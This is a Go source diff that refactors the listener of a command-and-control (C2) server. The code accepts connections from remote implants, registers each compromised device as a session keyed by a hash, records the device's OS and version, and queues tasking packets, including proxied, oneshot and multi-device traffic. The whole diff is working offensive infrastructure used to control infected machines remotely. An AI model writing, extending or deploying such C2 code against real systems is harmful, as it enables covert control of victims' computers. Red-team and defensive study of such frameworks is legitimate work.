@@ -1,9 +1,8 @@
 package c2
 
 import (
+	"bytes"
 	"context"
-	"hash"
-	"hash/fnv"
 	"io"
 	"sync"
 	"time"
@@ -26,15 +25,6 @@ var (
 			}
 		},
 	}
-	hashers = &sync.Pool{
-		New: func() interface{} {
-			return fnv.New32()
-		},
-	}
-
-	pingPacket     = &com.Packet{ID: PacketPing}
-	sleepPacket    = &com.Packet{ID: PacketSleep}
-	registerPacket = &com.Packet{ID: PacketRegistered}
 )
 
 // Handle is a struct that is passed back when a Listener
@@ -42,19 +32,22 @@ var (
 // the listener and setting callback functions to be used when a client
 // connect, registers or disconnects.
 type Handle struct {
-	Size       int
 	Wrapper    Wrapper
+	Oneshot    func(*Session, *com.Packet)
 	Receive    func(*Session, *com.Packet)
 	Connect    func(*Session)
 	Register   func(*Session)
-	Sessions   map[uint32]*Session
-	Transport  Transport
+	Transform  Transform
 	Disconnect func(*Session)
 
-	ctx      context.Context
-	hasher   hash.Hash32
-	cancel   context.CancelFunc
-	listener Listener
+	ctx        context.Context
+	name       string
+	size       int
+	close      chan uint32
+	cancel     context.CancelFunc
+	sessions   map[uint32]*Session
+	listener   Listener
+	controller *controller
 }
 type buffer struct {
 	w    io.WriteCloser
@@ -66,103 +59,323 @@ type buffer struct {
 }
 type wrapBuffer buffer
 
+// Wait will block until the current Listener associated with
+// this Handle is closed and shutdown.
+func (h *Handle) Wait() {
+	<-h.ctx.Done()
+}
+func (h *Handle) listen() {
+	h.controller.Log.Trace("[%s] Starting listen \"%s\"...", h.name, h.listener.String())
+	for h.ctx.Err() == nil {
+		if len(h.close) > 0 {
+			for x := 0; x < len(h.close); x++ {
+				v := <-h.close
+				if h.Disconnect != nil {
+					h.controller.events <- &eventCallback{
+						session:     h.sessions[v],
+						sessionFunc: h.Disconnect,
+					}
+				}
+				delete(h.sessions, v)
+			}
+		}
+		c, err := h.listener.Accept()
+		if err != nil {
+			h.controller.Log.Error("[%s] Received error during listener operation! (%s)", h.name, err.Error())
+			if h.ctx.Err() != nil {
+				break
+			}
+		}
+		if c == nil {
+			continue
+		}
+		h.controller.Log.Trace("[%s] Received a connection from \"%s\"...", h.name, c.IP())
+		go h.session(c)
+	}
+	h.controller.Log.Debug("[%s] Stopping listen...", h.name)
+	h.Close()
+	for _, v := range h.sessions {
+		v.Close()
+	}
+}
 func returnBuffer(b *buffer) {
 	b.Reset()
 	buffers.Put(b)
+}
+
+func (h *Handle) Remove(i device.ID) {
+	h.close <- i.Hash()
+}
+func (h *Handle) Sessions() []*Session {
+	l := make([]*Session, 0, len(h.sessions))
+	for _, v := range h.sessions {
+		l = append(l, v)
+	}
+	return l
+}
+func (h *Handle) Session(i device.ID) *Session {
+	if i == nil {
+		return nil
+	}
+	if s, ok := h.sessions[i.Hash()]; ok {
+		return s
+	}
+	return nil
 }
 
 // Close stops the operation of the Listener associated with
 // this Handle and any clients that may be connected. Resources used
 // with this Ticket and Listener will be freed up for reuse.
 func (h *Handle) Close() error {
+	defer func() { recover() }()
+	if h.ctx.Err() == nil {
+	}
 	h.cancel()
-	return h.listener.Close()
+	err := h.listener.Close()
+	close(h.close)
+	return err
 }
-func (h *Handle) listen(c *controller) {
-	c.Log.Trace("[%s] Starting listen...", h.listener.String())
-	for h.ctx.Err() == nil {
-		n, err := h.listener.Accept()
-		if err != nil {
-			c.Log.Error("[%s] Received error during listener operation! (%s)", h.listener.String(), err.Error())
-			break
-		}
-		c.Log.Trace("[%s] Received a connected from \"%s\"...", h.listener.String(), n.IP())
-		go h.client(c, n)
-	}
-	c.Log.Debug("[%s] Stopping listen...", h.listener.String())
-	h.Close()
+
+// IsActive returns true if the Listener associated with this
+// Handle is still able to send and receive Packets.
+func (h *Handle) IsActive() bool {
+	return h.ctx.Err() == nil
 }
-func (h *Handle) client(a *controller, c Connection) {
+func (h *Handle) session(c Connection) {
 	defer c.Close()
-	p, err := read(c, h.Wrapper, h.Transport)
-	if err != nil || p == nil || p.Empty() {
-		a.Log.Warning("[%s] Received an error when attempting to read a Packet from \"%s\"! (%s)", h.listener.String(), c.IP(), err.Error())
+	p, err := read(c, h.Wrapper, h.Transform)
+	if err != nil {
+		h.controller.Log.Warning("[%s] %s: Received an error when attempting to read a Packet! (%s)", h.name, c.IP(), err.Error())
 		return
 	}
-	x := hashers.Get().(hash.Hash32)
-	x.Reset()
-	x.Write(p.Device)
-	i := x.Sum32()
-	hashers.Put(x)
-	a.Log.Trace("[%s] Received a packet \"%s\" from \"%s\" (\"%s\") hash \"%X\".", h.listener.String(), p.String(), p.Device.ID(), c.IP(), i)
-	s, ok := h.Sessions[i]
-	if !ok && p.ID != PacketHello {
-		a.Log.Warning("[%s] Received a non-hello packet from non-registered client \"%s\"!", h.listener.String(), c.IP())
+	if p == nil || p.IsEmpty() {
+		h.controller.Log.Warning("[%s] %s: Received an empty or invalid Packet!", h.name, c.IP())
 		return
 	}
-	if !ok {
-		s = &Session{
-			ID:        p.Device[device.MachineIDSize:],
-			Host:      &device.Machine{},
-			send:      make(chan *com.Packet, h.Size),
-			recv:      make(chan *com.Packet, h.Size),
-			parent:    h,
-			wrapper:   h.Wrapper,
-			Created:   time.Now(),
-			transport: h.Transport,
-		}
-		s.ctx, s.cancel = context.WithCancel(h.ctx)
-		h.Sessions[i] = s
-		a.Log.Debug("[%s] New client \"%s\" (\"%s\") registered as \"%s\"!", h.listener.String(), p.Device.ID(), c.IP(), s.ID)
+	if p.Flags&com.FlagIgnore != 0 {
+		h.controller.Log.Trace("[%s:%s] %s: Received an ignore packet.", h.name, p.Device.ID(), c.IP())
+		return
 	}
-	s.server = c.IP()
-	s.Last = time.Now()
-	if p.ID == PacketHello {
-		if err := s.Host.UnmarshalStream(p); err != nil {
-			a.Log.Warning("[%s] Received an error reading data from client \"%s\"! (%s)", h.listener.String(), c.IP(), err.Error())
+	if p.Flags&com.FlagOneshot != 0 {
+		h.controller.Log.Trace("[%s:%s] %s: Received an oneshot packet.", h.name, p.Device.ID(), c.IP())
+		process(h, nil, p)
+		return
+	}
+	if p.Flags&com.FlagMulti == 0 || p.Flags&com.FlagMultiDevice == 0 {
+		if s := h.client(c, p); s != nil {
+			v, err := next(s.send, s.Device.ID)
+			if err != nil {
+				h.controller.Log.Warning("[%s:%s] %s: Received an error gathering packet data! (%s)", h.name, s.Device.ID.ID(), c.IP(), err.Error())
+				return
+			}
+			h.controller.Log.Trace("[%s:%s] %s: Sending Packet \"%s\" to client.", h.name, s.Device.ID.ID(), c.IP(), v.String())
+			if err := write(c, h.Wrapper, h.Transform, v); err != nil {
+				h.controller.Log.Warning("[%s:%s] %s: Received an error writing data to client! (%s)", h.name, s.Device.ID.ID(), c.IP(), err.Error())
+			}
+		}
+		return
+	}
+	n := p.Flags.FragTotal()
+	if n == 0 {
+		h.controller.Log.Warning("[%s:%s] %s: Received an invalid multi Packet!", h.name, p.Device.ID(), c.IP())
+		return
+	}
+	var i, t uint16
+	m := &com.Packet{ID: PacketMultiple}
+	for ; i < n; i++ {
+		v := &com.Packet{}
+		if err := v.UnmarshalStream(p); err != nil {
+			h.controller.Log.Warning("[%s:%s] %s: Received an error when attempting to read a Packet from \"%s\"! (%s)", h.name, p.Device.ID(), c.IP(), err.Error())
 			return
 		}
-		a.Log.Trace("[%s] Received client \"%s\" (\"%s\") device info! OS: %s, %s", h.listener.String(), s.Host.ID.ID(), c.IP(), s.Host.OS.String(), s.Host.Version)
-		if err := write(c, h.Wrapper, h.Transport, registerPacket); err != nil {
-			a.Log.Warning("[%s] Received an error writing data to client \"%s\"! (%s)", h.listener.String(), c.IP(), err.Error())
+		if v.Flags&com.FlagOneshot != 0 {
+			h.controller.Log.Trace("[%s:%s] %s: Received an oneshot packet.", h.name, v.Device.ID(), c.IP())
+			process(h, nil, v)
+			continue
+		}
+		s := h.client(c, v)
+		if s == nil {
+			continue
+		}
+		r, err := next(s.send, s.Device.ID)
+		if err != nil {
+			h.controller.Log.Warning("[%s:%s] %s: Received an error gathering packet data! (%s)", h.name, s.Device.ID.ID(), c.IP(), err.Error())
 			return
 		}
-		if h.Register != nil {
-			h.Register(s)
+		if err := r.MarshalStream(m); err != nil {
+			h.controller.Log.Warning("[%s:%s] %s: Received an error writing data to client buffer! (%s)", h.name, s.Device.ID.ID(), c.IP(), err.Error())
+			return
 		}
+		t++
+	}
+	p.Close()
+	m.Close()
+	m.Flags.SetFragTotal(t)
+	m.Flags = m.Flags | com.FlagMulti | com.FlagMultiDevice
+	h.controller.Log.Trace("[%s:%s] %s: Sending Packet \"%s\" to client.", h.name, p.Device.ID(), c.IP(), m.String())
+	if err := write(c, h.Wrapper, h.Transform, m); err != nil {
+		h.controller.Log.Warning("[%s:%s] %s: Received an error writing data to client! (%s)", h.name, p.Device.ID(), c.IP(), err.Error())
+		return
+	}
+}
+func processFully(h *Handle, s *Session, p *com.Packet) {
+	if h != nil && h.Receive != nil {
+		h.controller.events <- &eventCallback{
+			packet:     p,
+			session:    s,
+			packetFunc: h.Receive,
+		}
+	}
+	if s == nil {
 		return
 	}
 	if s.Receive != nil {
-		s.Receive(p)
-	}
-	if h.Receive != nil {
-		h.Receive(s, p)
+		s.controller.events <- &eventCallback{
+			packet:     p,
+			session:    s,
+			packetFunc: s.Receive,
+		}
 	}
 	if len(s.recv) == cap(s.recv) {
 		<-s.recv
 	}
 	s.recv <- p
-	v := sleepPacket
-	if len(s.send) > 0 {
-		v = <-s.send
-	}
-	a.Log.Trace("[%s] Sending Packet \"%s\" to client \"%s\".", h.listener.String(), v.String(), c.IP())
-	if err := write(c, h.Wrapper, h.Transport, v); err != nil {
-		a.Log.Warning("[%s] Received an error writing data to client \"%s\"! (%s)", h.listener.String(), c.IP(), err.Error())
-		return
+	if p.ID == PacketShutdown {
+		s.controller.Log.Debug("[%s] Client indicated shutdown, closing Session.", s.ID.ID())
+		s.Close()
 	}
 }
-func read(c io.Reader, w Wrapper, t Transport) (*com.Packet, error) {
+func process(h *Handle, s *Session, p *com.Packet) error {
+	if h == nil && s == nil {
+		return nil
+	}
+	if p == nil || p.IsEmpty() || p.Flags&com.FlagIgnore != 0 || p.Device == nil {
+		return nil
+	}
+	if s != nil && !bytes.Equal(p.Device, s.Device.ID) && p.Flags&com.FlagMultiDevice == 0 {
+		if s.proxies == nil {
+			return ErrInvalidPacketID
+		}
+		if c, ok := s.proxies[p.Device.Hash()]; ok {
+			c.send <- p
+		}
+		return nil
+	}
+	if h != nil && p.Flags&com.FlagOneshot != 0 {
+		if h.Oneshot != nil {
+			h.controller.events <- &eventCallback{
+				packet:     p,
+				packetFunc: h.Oneshot,
+			}
+		}
+		if h.Receive != nil {
+			h.controller.events <- &eventCallback{
+				packet:     p,
+				packetFunc: h.Receive,
+			}
+		}
+		return nil
+	}
+	if s == nil {
+		return nil
+	}
+	if (p.ID == PacketPing || p.ID == PacketHello || p.ID == PacketSleep) && p.Flags&com.FlagData == 0 {
+		return nil
+	}
+	if p.Flags&com.FlagMultiDevice == 0 && s.Update != nil {
+		s.controller.events <- &eventCallback{
+			session:     s,
+			sessionFunc: s.Update,
+		}
+	}
+	switch {
+	case p.Flags&com.FlagData != 0:
+		v := &com.Packet{}
+		if err := v.UnmarshalStream(p); err != nil {
+			return err
+		}
+		process(h, s, v)
+		return p.Close()
+	case p.Flags&com.FlagFrag != 0:
+		// Work on frag handeling...
+	case p.Flags&com.FlagMulti != 0:
+		n := p.Flags.FragTotal()
+		if n == 0 {
+			return ErrInvalidPacketCount
+		}
+		for i := uint16(0); i < n; i++ {
+			v := &com.Packet{}
+			if err := v.UnmarshalStream(p); err != nil {
+				return err
+			}
+			process(h, s, v)
+		}
+		return p.Close()
+	default:
+		processFully(h, s, p)
+	}
+	return nil
+}
+func (h *Handle) client(c Connection, p *com.Packet) *Session {
+	i := p.Device.Hash()
+	h.controller.Log.Trace("[%s:%s] %s: Received a packet \"%s\".", h.name, p.Device.ID(), c.IP(), p.String())
+	s, ok := h.sessions[i]
+	if !ok {
+		if p.ID != PacketHello {
+			h.controller.Log.Warning("[%s:%s] %s: Received a non-hello packet from a unregistered client!", h.name, p.Device.ID(), c.IP())
+			return nil
+		}
+		s = &Session{
+			ID:         p.Device[device.MachineIDSize:],
+			send:       make(chan *com.Packet, h.size),
+			recv:       make(chan *com.Packet, h.size),
+			parent:     h,
+			Device:     &device.Machine{},
+			wrapper:    h.Wrapper,
+			Created:    time.Now(),
+			transform:  h.Transform,
+			controller: h.controller,
+		}
+		s.ctx, s.cancel = context.WithCancel(h.ctx)
+		h.sessions[i] = s
+		h.controller.Log.Debug("[%s:%s] %s: New client registered as \"%s\" hash \"%X\".", h.name, p.Device.ID(), c.IP(), s.ID, i)
+	}
+	s.server = c.IP()
+	s.Last = time.Now()
+	if p.ID == PacketHello {
+		if err := s.Device.UnmarshalStream(p); err != nil {
+			h.controller.Log.Warning("[%s:%s] %s: Received an error reading data from client! (%s)", h.name, p.Device.ID(), c.IP(), err.Error())
+			return nil
+		}
+		h.controller.Log.Trace("[%s:%s] %s: Received client device info: (OS: %s, %s).", h.name, s.Device.ID.ID(), c.IP(), s.Device.OS.String(), s.Device.Version)
+		if p.Flags&com.FlagProxy == 0 {
+			if err := write(c, h.Wrapper, h.Transform, &com.Packet{ID: PacketRegistered, Device: p.Device}); err != nil {
+				h.controller.Log.Warning("[%s:%s] %s: Received an error writing data to client! [%s]", h.name, s.Device.ID.ID(), c.IP(), err.Error())
+				return nil
+			}
+		}
+		if h.Register != nil {
+			h.controller.events <- &eventCallback{
+				session:     s,
+				sessionFunc: h.Register,
+			}
+		}
+		process(h, s, p)
+		return s
+	}
+	if h.Connect != nil {
+		h.controller.events <- &eventCallback{
+			session:     s,
+			sessionFunc: h.Connect,
+		}
+	}
+	if err := process(h, s, p); err != nil {
+		h.controller.Log.Warning("[%s:%s] %s: Received an error processing packet data! (%s)", h.name, s.Device.ID.ID(), c.IP(), err.Error())
+		return nil
+	}
+	return s
+}
+func read(c io.Reader, w Wrapper, t Transform) (*com.Packet, error) {
 	b := buffers.Get().(*buffer)
 	defer returnBuffer(b)
 	var n int
@@ -189,10 +402,10 @@ func read(c io.Reader, w Wrapper, t Transport) (*com.Packet, error) {
 	if err != nil {
 		return nil, err
 	}
+	b.Close()
 	b.r = w.Unwrap(b)
 	p := &com.Packet{}
 	q := wrapBuffer(*b)
-	b.Close()
 	if err := p.UnmarshalStream(&q); err != nil {
 		return nil, err
 	}
@@ -202,7 +415,7 @@ func read(c io.Reader, w Wrapper, t Transport) (*com.Packet, error) {
 	b.r = nil
 	return p, nil
 }
-func write(c io.Writer, w Wrapper, t Transport, p *com.Packet) error {
+func write(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
 	b := buffers.Get().(*buffer)
 	defer returnBuffer(b)
 	b.w = w.Wrap(b)
